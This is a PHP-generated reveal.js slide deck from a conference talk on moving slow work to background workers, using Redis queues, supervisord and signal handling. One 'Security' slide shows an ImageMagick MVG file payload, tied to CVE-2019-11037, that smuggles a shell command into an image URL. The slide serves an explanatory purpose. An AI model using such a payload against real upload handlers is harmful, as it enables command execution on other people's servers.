<?php


function pointyLine(int $x1, int $y1, int $x2, int $y2)
{
    $deltaX = $x2 - $x1;
    $deltaY = $y2 - $y1;
    $degrees = (int)rad2deg(atan2($deltaY, $deltaX));
    $degrees -= 90;

    $length = 5 - sqrt(($deltaY * $deltaY) + ($deltaX * $deltaX));

    $svg = <<< SVG
    <g transform="translate($x2 $y2) rotate($degrees)">
      <line x1="0" y1="-5" x2="0" y2="$length" style="stroke:rgb(0,0,0);stroke-width:6" stroke-linecap="round" />
      <polygon points="0,2 -20,-50 20,-50"  />
    </g>
SVG;

    return $svg;
}


?>

<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">

  <title>Background workers - why and how.</title>

  <meta name="description" content="Danack talking about background workers">
  <meta name="author" content="Dan Ackroyd">
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">

  <link rel="stylesheet" href="css/reveal.css">
  <!-- link rel="stylesheet" href="css/theme/black.css" id="theme" -->
  <link rel="stylesheet" href="css/theme/whiteDanack.css" id="themecss">
  <!-- <link rel="stylesheet" href="lib/css/vsdanack.css" id="codeststylecss"> -->
  <link rel="stylesheet" href="lib/css/zenburn_backup.css" id="codeststylecss">

  <style type="text/css">
    /* overrides */


    body {
      background: #a8fcfc;
      /* background: -moz-radial-gradient(center, circle cover, #ffffff 0%, #1f1f1f 100%);
      background: -webkit-gradient(radial, center center, 0px, center center, 100%, color-stop(0%, #555a5f), color-stop(100%, #1f1f1f));*/
      background: -webkit-radial-gradient(center, circle cover, #f2f3ff 45%, rgba(36, 133, 245, 0.21) 75%);
      /* background: -o-radial-gradient(center, circle cover, #ffffff 0%, #efefef 100%);
      background: -ms-radial-gradient(center, circle cover, #ffffff 0%, #efefef 100%); */
      /* background: radial-gradient(center, circle cover, #ffffff 0%, #7f7f7f 100%); */
      /*background-color: #fdfdfd; */
    }
    .reveal section img {
      border: 0;
      background: none;
      box-shadow: 0 0 #000;
    }
    .reveal pre {
      width: 90%;
      font-size: 0.68em;
      margin-left: 0px;
      margin-right: auto;
      padding-left: 20px;
      padding-right: 20px;
      padding-top: 20px;
      padding-bottom: 20px;

      /* box-shadow: 0px 0px 24px rgba(0, 0, 0, 0.7); */
    }

    /*
    .reveal pre {
      box-shadow: 0px 0px 6px rgba(0, 0, 0, 0.3);
    }

    */

    .preformatted {
      font-family: monospace;
      white-space: pre;
    }

    .spaceTop {
      margin-top: 50px !important;
    }
    .spaceBottom {
      margin-bottom: 50px !important;
    }


    .submit_button {
      border: 5px solid #13719d !important;
      background-color: #0cb4ff;
      color: #fff;
    }

    /*h2, p, section { text-align: left; }*/
    /*.reveal .slides {text-align: left; }*/


    .left,
    .left > h1,
    .left > h2,
    .left > p { text-align: left; }

    h1, h2, h3, h4, h5 {
      font-family: "Quicksand", sans-serif !important;
      font-weight: 400 !important;
      /*text-transform: uppercase; */
    }

    .embiggen {
      font-size: 1.2em !important;
    }
    .emlargen {
      font-size: 1.05em !important;
    }

    .emnormal {
      font-size: 0.9em !important;
    }

    .emsmallen {
      font-size: 0.8em !important;
    }
    .em_075 {
      font-size: 0.75em !important;
    }
    .em_08 {
      font-size: 0.8em !important;
    }
    .em_085 {
      font-size: 0.9em !important;
    }
    .em_09 {
      font-size: 0.9em !important;
    }
    .em_095 {
      font-size: 0.95em !important;
    }
    .em1 {
      font-size: 1.0em !important;
    }
    .em1_1 {
      font-size: 1.1em !important;
    }

    .em1_05 {
      font-size: 1.05em !important;
    }
    .em1_1 {
      font-size: 1.1em !important;
    }
    .em1_5 {
      font-size: 1.5em !important;
    }
    .em1_2 {
      font-size: 1.2em !important;
    }
    .em1_3 {
      font-size: 1.3em !important;
    }
    .em1_4 {
      font-size: 1.4em !important;
    }

    .em1_6 {
      font-size: 1.6em !important;
    }

    .em1_8 {
      font-size: 1.8em !important;
    }

    .em2 {
      font-size: 2em !important;
    }
    .em2_2 {
      font-size: 2.2em !important;
    }
    .em2_4 {
      font-size: 2.4em !important;
    }
    .em3 {
      font-size: 3em !important;
    }
    .em4 {
      font-size: 4em !important;
    }
    th {
      font-size: 1.5em !important;
    }

    .finale {
      font-size: 148px !important;
      text-align: center !important;
      /* margin-bottom: 148px !important; */
    }
    .speaker-controls-notes > ul,
    .speaker-controls-notes ul,
    .notes > ul,
    .notes  ul{
      margin-top: 0px;
      margin-bottom: 0px;
    }

    .centre {
      text-align: center !important;
    }

    .subtle {
      color: #7c7c7c;
    }

    .smallText {
      font-size: 24px !important;
    }

    blockquote {
      background-color: #f5f5f5;
    }

    blockquote {
      width: 90% !important;
      /* font-size: 36px !important; */
    }

    pre, .danackCode {
      font-size: 26px;
    }

    .rotate {
      /* Safari */
      -webkit-transform: rotate(-90deg);

      /* Firefox */
      -moz-transform: rotate(-90deg);

      /* IE */
      -ms-transform: rotate(-90deg);

      /* Opera */
      -o-transform: rotate(-90deg);

      /* Internet Explorer */
      filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=3);
    }

    .iframeScale {

      -ms-zoom: 2;
      -moz-transform: scale(2);
      -moz-transform-origin: 0 0;
      -o-transform: scale(2);
      -o-transform-origin: 0 0;
      -webkit-transform: scale(2);
      -webkit-transform-origin: 0 0;
    }

  </style>

  <!-- Printing and PDF exports -->
  <script>
    var link = document.createElement( 'link' );
    link.rel = 'stylesheet';
    link.type = 'text/css';
    link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
    document.getElementsByTagName( 'head' )[0].appendChild( link );
  </script>
  <script src="./plugin/jquery/jquery.min.js"></script>
</head>

<body>
<div class="reveal">
  <div class="slides">



<!-- *************************** -->
<section class="em1_4">
  <h1>The benefits of background workers.</h1>
  <h3>aka shifting the load off your webserver.</h3>
  <p>
    <a href="http://twitter.com/MrDanack">@MrDanack</a>
  </p>

  <p class="subtle" style="padding-top: 100px">
    <small>Press 'c' to toggle code style</small><br/>
    <small>Press 's' for speaker notes</small>
  </p>
</section>



<!-- *************************** -->
<section data-background="white">
  <svg width="1600" height="1200" style="background-color: #fff">

    <g transform="translate(850 100)">
      <rect x="-100" y="-50" width="200" height="100"  style="fill:rgb(207, 226, 243);stroke-width:3;stroke:rgb(0,0,0)" />
      <text text-anchor="middle" alignment-baseline="middle" fill="black">Server</text>
      <line y1="50" y2="1000" style="stroke:rgb(0,0,0);stroke-width:2" stroke-linecap="butt" />
      <rect x="-25" y="200" width="50" height="50" style="fill:rgb(255, 153, 0);stroke-width:3;stroke:rgb(0,0,0)" />
    </g>

    <g transform="translate(300 100)">
      <rect x="-100" y="-50" width="200" height="100" style="fill:rgb(207, 226, 243);stroke-width:3;stroke:rgb(0,0,0)" />
      <text x="0" y="0" text-anchor="middle" alignment-baseline="middle" fill="black">Client</text>
      <line y1="50" y2="1000" style="stroke:rgb(0,0,0);stroke-width:2" stroke-linecap="butt" />
    </g>

      <?= pointyLine(300, 220, 825, 300); ?>
      <?= pointyLine(825, 350, 300, 420); ?>
  </svg>


  <aside class="notes">
    <p>
      Quick recap of what happens when a HTTP request is made. Client sends a request, server receives it, does some processing, and then sends a response.
    </p>
    <p>
      Most requests are going to be quick, but most systems have some requests that will be much slower.
    </p>
    <p>Things like generating images, producing complicated reports, or when you need to make multiple external api requests all take quite a bit of time, and this is where the problems start.</p>

    <p>
      This can cause two major problems.
    </p>

  </aside>
</section>




<!-- *************************** -->
<section data-background="white">
  <svg width="1600" height="1200" style="background-color: #fff">

    <g transform="translate(850 100)">
      <rect x="-100" y="-50" width="200" height="100"  style="fill:rgb(207, 226, 243);stroke-width:3;stroke:rgb(0,0,0)" />
      <text text-anchor="middle" alignment-baseline="middle" fill="black">Server</text>
      <line y1="50" y2="1000" style="stroke:rgb(0,0,0);stroke-width:2" stroke-linecap="butt" />
      <rect x="-25" y="200" width="50" height="550" style="fill:rgb(255, 153, 0);stroke-width:3;stroke:rgb(0,0,0)" />
    </g>

    <g transform="translate(300 100)">
      <rect x="-100" y="-50" width="200" height="100" style="fill:rgb(207, 226, 243);stroke-width:3;stroke:rgb(0,0,0)" />
      <text x="0" y="0" text-anchor="middle" alignment-baseline="middle" fill="black">Client</text>
      <line y1="50" y2="1000" style="stroke:rgb(0,0,0);stroke-width:2" stroke-linecap="butt" />
    </g>

      <?= pointyLine(300, 220, 825, 300); ?>
      <?= pointyLine(825, 850, 300, 920); ?>
  </svg>
</section>


<!-- *************************** -->
<section class="em1_4">
  <h1>Denial of service attack</h1>

  <div style="height: 100px"></div>

  <p class="fragment em1_4">
    4GB / 128 MB  = 32 requests<br/>
    to lock up a server for 30 seconds.
  </p>

  <aside class="notes">

    <p>So....I once wrote some code for generating a report. <And></And></p>
    <p>
      Ok quick survey.

    </p>
  </aside>
</section>


<!-- *************************** -->
<section class="em1_4 left">
  <h3>Bad user experience</h3>
  <div style="200px"></div>
  <table width="100%">
    <tr>
      <td style="border: 3px solid #000; height: 600px">
        <div style="width: 500px;"></div>
        Form 1
        <div style="height: 200px"></div>
        <span>
          <div class='submit_button' id="submit_button_1">Submit form</div>
        </span>
      </td>

      <td style="width: 200px">
        &nbsp;
      </td>

      <td style="border: 3px solid #000; height: 600px">
        <div style="width: 500px;"></div>
        <div>Form 2</div>
        <div style="height: 200px"></div>

        <span >
          <div class='submit_button' id="submit_button_2" >Submit form</div>
        </span>

      </td>

    </tr>
  </table>

  <aside class="notes">
  </aside>
</section>




<!--&lt;!&ndash; *************************** &ndash;&gt;-->
<section class="centre">

  <h2>Security</h2>

  <p>CVE-2019-11037 - my bad</p>

  <pre class="danackCode" data-trim>
<code class="php">
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://example.com/image.jpg"|ls "-la)'
  pop graphic-context

  // Upload as .mvg file
</code>
</pre>

  <aside class="notes">
  </aside>
</section>


<!--&lt;!&ndash; *************************** &ndash;&gt;-->
<section class="centre">

  <h2>Security</h2>
  <img src="/images/ImageMagickVulns.png" />

  <aside class="notes">
  </aside>
</section>





  <!-- *************************** -->
<section data-background="white">
  <svg width="1600" height="1200" style="background-color: #fff">

    <g transform="translate(850 100)">

      <rect x="-100" y="-50" width="200" height="100"  style="fill:rgb(207, 226, 243);stroke-width:3;stroke:rgb(0,0,0)" />
      <text text-anchor="middle" alignment-baseline="middle" fill="black">Server</text>
      <line y1="50" y2="1000" style="stroke:rgb(0,0,0);stroke-width:2" stroke-linecap="butt" />

      <rect x="-25" y="200" width="50" height="50" style="fill:rgb(255, 153, 0);stroke-width:3;stroke:rgb(0,0,0)" />
      <rect x="-25" y="500" width="50" height="50" style="fill:rgb(255, 153, 0);stroke-width:3;stroke:rgb(0,0,0)" />
      <rect x="-25" y="800" width="50" height="50" style="fill:rgb(255, 153, 0);stroke-width:3;stroke:rgb(0,0,0)" />
    </g>



    <g transform="translate(300 100)">
      <rect x="-100" y="-50" width="200" height="100" style="fill:rgb(207, 226, 243);stroke-width:3;stroke:rgb(0,0,0)" />
      <text x="0" y="0" text-anchor="middle" alignment-baseline="middle" fill="black">Client</text>
      <line y1="50" y2="1000" style="stroke:rgb(0,0,0);stroke-width:2" stroke-linecap="butt" />
    </g>


    <g transform="translate(1400 100)">
      <rect x="-100" y="-50" width="200" height="100" style="fill:rgb(207, 226, 243);stroke-width:3;stroke:rgb(0,0,0)" />
      <text x="0" y="0" text-anchor="middle" alignment-baseline="middle" fill="black">Worker</text>
      <line y1="50" y2="1000" style="stroke:rgb(0,0,0);stroke-width:2" stroke-linecap="butt" />

      <rect x="-25" y="250" width="50" height="500" style="fill:rgb(255, 153, 0);stroke-width:3;stroke:rgb(0,0,0)" />
    </g>

      <!-- Client to server request -->
      <?= pointyLine(300, 220, 825, 300); ?>
      <?= pointyLine(825, 350, 300, 400); ?>


    <text x="290" y="230" text-anchor="end" alignment-baseline="middle" fill="black">Request</text>
    <text x="290" y="400" text-anchor="end" alignment-baseline="middle" fill="black">$jobID</text>

      <!-- Server to worker -->
      <?= pointyLine(875, 300, 1375, 350); ?>
      <?= pointyLine(1375, 850, 875, 900); ?>

      <!-- Client to server data not ready -->
      <?= pointyLine(300, 530, 825, 600); ?>
      <?= pointyLine(825, 650, 300, 720); ?>

      <text x="290" y="540" text-anchor="end" alignment-baseline="middle" fill="black">$jobID data?</text>
      <text x="290" y="720" text-anchor="end" alignment-baseline="middle" fill="black">Not ready</text>

    <!-- Client to server data ready -->
      <?= pointyLine(300, 830, 825, 900); ?>
      <?= pointyLine(825, 950, 300, 1020); ?>


    <text x="290" y="840" text-anchor="end" alignment-baseline="middle" fill="black">$jobID data?</text>
    <text x="290" y="1020" text-anchor="end" alignment-baseline="middle" fill="black">Here's the data</text>
  </svg>

  <aside class="notes">
    <ul>
      <li>Worker is run in background and sits there waiting for data</li>
      <li>Request comes in</li>
      <li>Info is pushed into a queue/message</li>
      <li>Worker picks up the data, does the work and pushes the results somewhere</li>
      <li>Browser polls (or websocket) for status.</li>
    </ul>
  </aside>
</section>


<!-- *************************** -->
<section class="em1_6 left">
  <h1>Demo time</h1>

  <iframe src="http://local.app.basereality.com/image_queue" width="1200px" height="800px" class="iframeScale"></iframe>
  <aside class="notes">
  </aside>
</section>






<!-- *************************** -->
<section class="em1_6 left">
  <h1>Components</h1>
  <div style="height: 150px"></div>

  <ul>
    <li>Job/message queue</li>
    <li>Some code to send/receive the jobs</li>
    <li>Something to keep the code running</li>
    <li>Some code to stop the jobs</li>
  </ul>


  <aside class="notes">
  </aside>
</section>



<!-- *************************** -->
<section class="em1_8">
  <h1>Message queues</h1>

  <div style="height: 150px"></div>

  <p>
    Redis, Gearman, RabbitMQ,  Amazon SQS
  </p>

  <aside class="notes">
    <p>
      The only thing that is important is that the number (and location) of your background workers
      shouldn't matter. Jobs should be able to be processed in any order.
    </p>

    <p>
      Small point, you should choose a queueing technology that you can easily find the number of items present on the queue.
      So not Google pub/sub queues.
    </p>
  </aside>
</section>


<!-- *************************** -->
<section class="em1_4">
  <img src="/images/DanackAndRedis.png" width="1400px" />
  <br/>

  <ul>
    <li>Very fast</li>
    <li>Useful for caching</li>
    <li>Lua scripting embedded</li>
  </ul>

  <aside class="notes">
    Not going to talk about making message queues reliable enough for banking application.
  </aside>
</section>



<!-- *************************** -->
<section class="em1_4">

  <img src="/images/xkcd_tasks.png" width="600px" />

  <aside class="notes">
  </aside>
</section>



<!-- *************************** -->
<section class="em1_4 left">
  <h3>Some code to send the jobs</h3>

  <pre class="danackCode" data-trim>
<code class="php">class RedisImageJobRepo {

    public function queueImageJob(ImageJob $imageJob)
    {
        $this->redis->rpush(
            ImageJobKey::getAbsoluteKeyName(),
            $imageJob->toString()
        );
        return true;
    }
}
</code></pre>

  <aside class="notes">
  </aside>
</section>



<!-- *************************** -->
<section class="em1_4 left">
  <h3>Some code to retrieve the jobs</h3>

  <pre class="danackCode" data-trim>
<code class="php">
class RedisImageJobRepo
{
    function waitForImageJob(int $timeout = 5): ?ImageJob {
        $key = ImageJobKey::getAbsoluteKeyName();

        // Next line sits and waits for a job
        $listElement = $this->redis->blpop([$key], $timeout);
        if (count($listElement) === 0) {
            return null;
        }

        $keyReturned = $listElement[0];
        $data = $listElement[1];

        $imageJob = ImageJob::fromString($data);

        return $imageJob;
    }
}
</code></pre>

  <aside class="notes">
  </aside>
</section>

<!-- *************************** -->
<section class="em1_4 left">
  <h3>Code for encapsulating keys</h3>

  <pre class="danackCode" data-trim>
<code class="php">
class ImageJobKey {
  static function getAbsoluteKeyName() : string {
    return str_replace('\\', '', __CLASS__);
  }

  static function getKeyNameForStatus(string $jobId): string {
    return str_replace('\\', '', __CLASS__) .
      ':status:' . $jobId;
  }
}

</code></pre>

  <aside class="notes">
  </aside>
</section>

<!---->
<!-- *************************** -->
<!--<section class="em1_4">-->
<!--  <h1>Consistent function name</h1>-->
<!---->
<!---->
<!--  <aside class="notes">-->
<!--  </aside>-->
<!--</section>-->
<!---->




    <!-- *************************** -->
<section class="em1_6">
  <h3>Something to keep the code running</h3>
  <div style="height: 150px"></div>
  <h1>
    Supervisord
  </h1>

  <aside class="notes">
    <p>
      It's a program that you tell to run other programs, and how many copies of that program should be run.
    </p>
    <p>
      It will start them for you, and restart them when they quit.
    </p>
  </aside>
</section>



<!-- *************************** -->
<section class="em1_8 left">
  <h3>Supervisord config</h3>

  <pre class="danackCode" data-trim>
<code class="php">[program:invoice_pdf_generator]
directory=/var/www
command=php cli.php process:invoices
process_name=%(program_name)s_%(process_num)d
user=www-data
numprocs=1
autostart=true
autorestart=true

# also boring log file stuff...
</code></pre>

  <aside class="notes">
    <p>
    So supervisord starts and keeps the programs alive.
    You can set how many you want to run.
    The one thing supervisord doesn't do out of the box is scale dynamically easily.
    </p>


  </aside>
</section>

  <!-- *************************** -->
  <section class="em1_4"><img src="/images/ScalingWorkers.jpg" width="1000px" />
    <aside class="notes">
    </aside>
  </section>



<!-- *************************** -->
<section class="em1_4">
  <table width="1200px">
    <tr>
      <td style="vertical-align: top;">
        <img src="/images/tangent_1.png" width="450px" style="background-color: white;"/>
        <div style="padding-right: 100px">
        </div>
      </td>
      <td style="vertical-align: top;">
        <img src="/images/tangent_2.png" width="450px" style="background-color: white;" />
      </td>
    </tr>
    <tr>
      <td style="vertical-align: top;">
        <img src="/images/tangent_3.png" width="400px" style="background-color: white;" />
      </td>
      <td style="vertical-align: top;">
        <img src="/images/tangent_4.jpg" width="450px"style="background-color: white;" />
      </td>
    </tr>
  </table>

  <aside class="notes">
  </aside>
</section>




    <!-- *************************** -->
<section data-background="white">
  <svg width="1600" height="1200" style="background-color: #fff">
    <line x1="200" y1="1000" x2="200" y2="50" style="stroke:rgb(0,0,0);stroke-width:6" stroke-linecap="butt" />
    <line x1="198" y1="1000" x2="1500" y2="1000" style="stroke:rgb(0,0,0);stroke-width:6" stroke-linecap="butt" />

    <text x="1500" y="1050" text-anchor="end" fill="black">Time</text>
    <text x="190" y="100" text-anchor="end" fill="black">Features</text>
    <text x="190" y="150" text-anchor="end" fill="black">delivered</text>


    <g class="fragment" data-fragment-index="1">
      <line x1="200" y1="1000" x2="400" y2="550" stroke="black" stroke-width="6" />
      <line x1="400" y1="550" x2="800" y2="500" stroke="black" stroke-width="6" />
      <text x="925" y="480" text-anchor="start" fill="black" class="fragment current-visible" data-fragment-index="1">Simpler tech</text>
    </g>

    <g class="fragment" data-fragment-index="2">
      <line x1="200" y1="1000" x2="800" y2="300" stroke="blue" stroke-width="6" />
      <line x1="800" y1="300" x2="1100" y2="220" stroke="blue" stroke-width="6" />
      <text x="1125" y="230" text-anchor="start" fill="black" class="fragment current-visible" data-fragment-index="2">More capable tech</text>
    </g>


    <line x1="200" y1="600" x2="1500" y2="600" stroke="red" stroke-width="5" stroke-dasharray="4 4" class="fragment" />
    <text x="1550" y="715" text-anchor="end" fill="black" class="fragment">Simpler tech wins</text>

    <line x1="200" y1="475" x2="1500" y2="475" stroke="red" stroke-width="5" stroke-dasharray="4 4" class="fragment" />
    <text x="1550" y="320" text-anchor="end" fill="black" class="fragment">More capable tech wins</text>

    <text class="fragment" x="1550" y="550" text-anchor="end" fill="black">You must choose, wisely</text>

  </svg>
</section>


<!-- *************************** -->
<section class="em1_4">
  <h2>"It's Time For Some Game Theory"</h2>
  <p>


  </p>

  <aside class="notes">
  </aside>
</section>



<!-- *************************** -->
<section class="em1_4">
  <img src="/images/never_scale.jpeg" width="1000px" />
  <aside class="notes">
  </aside>
</section>


    <!-- *************************** -->
<section class="em1_4">
  <img src="/images/CpuPricing.png" width="1200px" />
  <aside class="notes">
  </aside>
</section>


<!-- *************************** -->
<section class="em1_2 left">
  <h3>Emails: 4 GB / 16 MB per worker</h3>
  <div style="height: 50px"></div>
  <p class="em1_2">
    256 workers<br/>
    * 8 business hours a day<br/>
    * 5 days a week<br/>
    * 4 weeks a month<br/>
    * 3600 seconds in an hour<br/>
    / 4 seconds to send an email<br/>
  </p>
  <div style="height: 50px"></div>

  <p class="em1_4">
    = <b>36,864,000</b> emails a month
  </p>

  <aside class="notes">

  </aside>
</section>

<!-- *************************** -->
<section class="em1_2 left">
  <h2>&lt;/rant&gt;</h2>
  <aside class="notes">

  </aside>
</section>




<!-- *************************** -->
<section class="em1_4 left">
  <h3>Code to run in a loop</h3>

  <pre class="danackCode" data-trim>
<code class="php">
function continuallyExecuteCallable($callable, int $maxRunTime)
{
    $startTime = microtime(true);
    while (true) {
        $callable();
        if (checkSignalsForExit()) {
            break;
        }

        if ((microtime(true) - $startTime) > $maxRunTime) {
            break;
        }
    }
}
</code></pre>

  <aside class="notes">
  </aside>
</section>


<!-- *************************** -->
<section class="em1_6 left">
  <h2>Make code run in a loop</h2>
  <div style="height: 100px">

  </div>
  <ul>
    <li>Avoid DOS your own system</li>
    <li>Avoid DOS other people's system</li>
    <li>Avoid spinning your CPU at 100%</li>
  </ul>

  <aside class="notes">
    <p>How hard can it be to make some code loop?</p>
    <p>
      So, this is one of the reasons why I like Redis. Using the wait timeout on the pubsub listener makes it really easy to
    </p>
    <p>
      If you're using a DB for your queue,
    </p>
  </aside>
</section>



<!-- *************************** -->
<section class="em1_6 left">
  <h2>Some code to stop the jobs</h2>

  <div style="height: 150px"></div>

  <p>
    aka listen to signals.
  </p>

  <p>
    SIGINT -  Ctrl+C
  </p>

  <p>
    SIGTERM - graceful shut down.
    SIGKILL -
  </p>

  <blockquote class="em1_0">
    “Upon the receival of the SIGTERM, each container should start a graceful shutdown of the running application and exit.”

    “If a container doesn’t terminate within the grace period, a SIGKILL signal will be sent and the container violently terminated.”
  </blockquote>


  <aside class="notes">
    <p>
      So when you're running a program on a unix computer, when the operating system wants to tell that program it's time to quit, the operating system will pass a signal to the program.
    </p>
    <p>
      This is what happens when you press ctrl+c.
    </p>
    <p>
      This is also the
    </p>
  </aside>
</section>


<!-- *************************** -->
<section class="em1_2">
  <pre class="danackCode" data-trim>
<code class="php">function checkSignalsForExit()
{
    static $initialised = false;
    static $needToExit = false;

    if ($initialised === false) {
        $fnSignalHandler = function ($signalNumber) use (&$needToExit) {
            $needToExit = true;
        };

        pcntl_signal(SIGINT, $fnSignalHandler, false);
        pcntl_signal(SIGKILL, $fnSignalHandler, false);
        pcntl_signal(SIGQUIT, $fnSignalHandler, false);
        pcntl_signal(SIGTERM, $fnSignalHandler, false);
        pcntl_signal(SIGHUP, $fnSignalHandler, false);
        pcntl_signal(SIGUSR1, $fnSignalHandler, false);
        $initialised = true;
    }

    pcntl_signal_dispatch();

    return $needToExit;
}
</code></pre>

  <aside class="notes">
  </aside>
</section>




<!-- *************************** -->
<section class="em1_6 left">
  <h1>Other benefits</h1>

  <div style="height: 70px"></div>

  <ul>
    <li>
      Disable background workers when service is down
    </li>

    <li>
      Retrying failed jobs
    </li>

    <li>
      Performance tuning
    </li>

    <li>Performance monitoring and scaling</li>
    <li>Use different language</li>
  </ul>
  <div style="height: 170px">&nbsp;</div>

  <aside class="notes">

  </aside>
</section>







<!-- *************************** -->
<section class="em1_5" style="text-align: center">
  <h1 class="finale">Fin</h1>
  <div style="min-height: 100px">&nbsp;</div>

  <p>
    https://joind.in/talk/e99f1
  </p>

  <img src="/images/qr_code_background_workers.png"/>

  <p>https://github.com/Danack/example</p>

  <div style="text-align: center !important;"  >
    <p class="centre">Twitter: @MrDanack</p>
  </div>

  <aside class="notes">
  </aside>

</section>

<!-- *************************** -->
<section class="em1_4">
  <h1>Title</h1>

  <p>
    Words
  </p>

  <aside class="notes">

  </aside>
</section>


<!-- *************************** -->
<section style="width: 100%; text-align: center !important;">
  <img src="/images/true_neutral.jpg" />
</section>








  <!-- *************************** -->
  <section>
    <h1>
      The benefits of background workers.
    </h1>

    <p>



    Some things that need to be processed in an web based application can take a long time to run.

    Moving this work to be done in a background worker can provide lots of benefits for the user and make your life easier as a developer.

    Dan's going to talk about this stuff, going through exactly what the problems are, how to implement background workers, and the diverse benefits they give.

    </p>


    <aside class="notes">
    </aside>
  </section>


  </div>
</div>

<script src="lib/js/head.min.js"></script>
<script src="js/reveal.js"></script>

<script>
  // Full list of configuration options available at:
  // https://github.com/hakimel/reveal.js#configuration
  Reveal.initialize({
    controls: false,
    progress: false,
    history: true,
    center: true,
    width: 1600,
    height: 1200,

    // Factor of the display size that should remain empty around the content
    margin: 0.00,
    slideNumber: true,
    //transition: 'slide', // none/fade/slide/convex/concave/zoom
    transition: 'none',
    //transitionSpeed: "slow",

    // Optional reveal.js plugins
    dependencies: [
      { src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
      //{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
      //{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
      { src: 'plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad({languages: ["php"]}); },  },
      { src: 'plugin/zoom-js/zoom.js', async: true },
      { src: 'plugin/notes/notes.js', async: true }
    ]
  });


  /* This draws the graph on the slide on a slidechanged event */
  Reveal.addEventListener('slidechanged', function(event) {
    var callback = "render_"+event.currentSlide.id;
    if(typeof(window[callback])=="function") {
      window[callback]();
    }
  } );
  /* This draws the graph if we got here directly without coming from another slide */
  Reveal.addEventListener('ready', function(event) {
    var callback = "render_"+event.currentSlide.id;
    if(typeof(window[callback])=="function") {
      window[callback]();
    }
  });

  var createFunc = function() {
    var counter = 0;
    return function(e) {
      counter = (counter + 1);// % 1;

      var themeCSSList = [
        "css/theme/whiteDanack.css",
        "css/theme/beige.css",
        "css/theme/black.css",
        "css/theme/blood.css",
        "css/theme/league.css",
        "css/theme/moon.css",
        "css/theme/night.css",
        "css/theme/serif.css",
        "css/theme/simple.css",
        "css/theme/sky.css",
        "css/theme/solarized.css",
      ];

      var codeCSSList = [
        "lib/css/zenburn_backup.css",
        "lib/css/vsdanack.css",
      ];

      if(e.which == 67 || e.which == 99) { //'c'
//        var theme = themeCSSList[counter % themeCSSList.length];
//        $("#themecss").attr('href', theme);

        var codestyle = codeCSSList[counter % codeCSSList.length];
        $("#codeststylecss").attr('href', codestyle);
        $("#debug").text(codestyle);
      }
    };
  };


  function replaceElementText(id, newText, classToStyle)
  {
    var element1 = document.getElementById(id);


    var newDiv = document.createElement("div");
    newDiv.setAttribute("class", classToStyle);
    newDiv.id = id;
    // and give it some content
    var newContent = document.createTextNode(newText);

    newDiv.appendChild(newContent);

    element1.parentNode.replaceChild(newDiv, element1);

  }

  var createFormFunc = function() {

    return function(e) {

      // R or r
      if (e.which === 82 || e.which === 114) { //'c'
        replaceElementText('submit_button_1', "Submit form", "submit_button");
        replaceElementText('submit_button_2', "Submit form", "submit_button");
      }

      if (e.which === 49) {
        replaceElementText('submit_button_1', "Processing", "submit_processing");
        setTimeout(function() {
          replaceElementText('submit_button_1', "Processing.", "submit_processing");
        }, 2000);
        setTimeout(function() {
          replaceElementText('submit_button_1', "Processing..", "submit_processing");
        }, 4000);
        setTimeout(function() {
          replaceElementText('submit_button_1', "Processing...", "submit_processing");
        }, 6000);
        setTimeout(function() {
          replaceElementText('submit_button_1', "Processing....", "submit_processing");
        }, 8000);
        setTimeout(function() {
          replaceElementText('submit_button_1', "Complete!", "submit_processing");
        }, 10000);
      }

      if (e.which === 50) {
        replaceElementText('submit_button_2', "Sending data", "submit_processing");
        setTimeout(function() {
          replaceElementText('submit_button_2', "Validating data", "submit_processing");
        }, 2000);
        setTimeout(function() {
          replaceElementText('submit_button_2', "Querying database", "submit_processing");
        }, 4000);
        setTimeout(function() {
          replaceElementText('submit_button_2', "Processing results", "submit_processing");
        }, 6000);
        setTimeout(function() {
          replaceElementText('submit_button_2', "Reticulating splines", "submit_processing");
        }, 8000);
        setTimeout(function() {
          replaceElementText('submit_button_2', "Complete!", "submit_processing");
        }, 10000);
      }


    };
  };

  $(window).keypress(createFunc());

  $(window).keypress(createFormFunc());

</script>
</body>
</html>
